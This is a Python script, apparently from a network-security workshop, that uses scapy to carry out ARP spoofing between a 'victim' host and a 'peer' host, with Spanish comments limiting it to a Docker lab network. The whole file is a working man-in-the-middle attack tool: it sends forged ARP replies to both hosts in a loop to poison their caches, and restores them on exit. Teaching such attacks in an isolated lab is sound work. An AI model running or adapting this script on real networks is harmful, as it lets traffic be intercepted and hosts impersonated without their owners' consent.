#!/usr/bin/env python3
from __future__ import annotations

import argparse
import signal
import time

from scapy.all import ARP, Ether, sendp

from common import iface, mac_for_ip, print_banner, require_lab_ip, require_root_hint, setup_scapy


running = True


def stop_handler(signum, frame):
    global running
    running = False


def arp_reply(dst_ip: str, dst_mac: str, claimed_ip: str):
    return Ether(dst=dst_mac) / ARP(
        op=2,
        pdst=dst_ip,
        hwdst=dst_mac,
        psrc=claimed_ip,
    )


def restore(victim_ip: str, victim_mac: str, peer_ip: str, peer_mac: str, iface_name: str):
    print("\n[*] Restaurando ARP caches...")
    for _ in range(5):
        sendp(
            Ether(dst=victim_mac) / ARP(
                op=2,
                pdst=victim_ip,
                hwdst=victim_mac,
                psrc=peer_ip,
                hwsrc=peer_mac,
            ),
            iface=iface_name,
            verbose=False,
        )
        sendp(
            Ether(dst=peer_mac) / ARP(
                op=2,
                pdst=peer_ip,
                hwdst=peer_mac,
                psrc=victim_ip,
                hwsrc=victim_mac,
            ),
            iface=iface_name,
            verbose=False,
        )
        time.sleep(0.4)


def main():
    parser = argparse.ArgumentParser(
        description=(
            "ARP spoofing controlado entre dos hosts del laboratorio. "
            "Úsalo solo en la red Docker del taller."
        )
    )
    parser.add_argument("--victim", default="victim-client", help="Host víctima, por ejemplo victim-client.")
    parser.add_argument("--peer", default="web-server", help="Host par a suplantar ante la víctima.")
    parser.add_argument("--interval", type=float, default=1.5)
    parser.add_argument("--iface", default=iface())
    args = parser.parse_args()

    require_root_hint()
    setup_scapy()

    victim_ip = require_lab_ip(args.victim)
    peer_ip = require_lab_ip(args.peer)

    victim_mac = mac_for_ip(victim_ip)
    peer_mac = mac_for_ip(peer_ip)

    print_banner("ARP spoofing lab")
    print(f"victim: {args.victim} {victim_ip} {victim_mac}")
    print(f"peer:   {args.peer} {peer_ip} {peer_mac}")
    print("[*] Envenenando ARP caches. Ctrl+C para restaurar.")

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    try:
        while running:
            sendp(arp_reply(victim_ip, victim_mac, peer_ip), iface=args.iface, verbose=False)
            sendp(arp_reply(peer_ip, peer_mac, victim_ip), iface=args.iface, verbose=False)
            time.sleep(args.interval)
    finally:
        restore(victim_ip, victim_mac, peer_ip, peer_mac, args.iface)


if __name__ == "__main__":
    main()
